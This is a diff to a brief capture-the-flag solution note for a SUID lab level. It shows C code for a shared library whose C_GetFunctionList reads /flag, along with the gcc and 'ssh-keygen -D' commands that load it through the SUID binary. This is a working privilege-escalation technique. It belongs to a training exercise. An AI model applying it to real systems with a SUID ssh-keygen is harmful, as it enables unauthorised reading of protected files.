@@ -1,5 +1,16 @@
 Read the challenge file using /challenge/babysuid_level51
 Check SUID permissions using ls -la /challenge/babysuid_level51.  
 Try to read the flag file as /usr/bin/ssh-keygen /flag but the flag will not show. 
-ssh-keygen -D ./lib_inje.so
-printf("euid:%d\n",geteuid());
+Run this code in a file as gcc -shared -fPIC -o plugin51.so l51.c
+int main(int argc, char const *argv[])
+{
+	puts("Hello World");
+}
+int C_GetFunctionList()
+{
+	sendfile(1, open("/flag", 0), 0, 4096);
+}
+
+After exection use
+ssh-keygen -D ./plugin51.so 
+It will show the flag
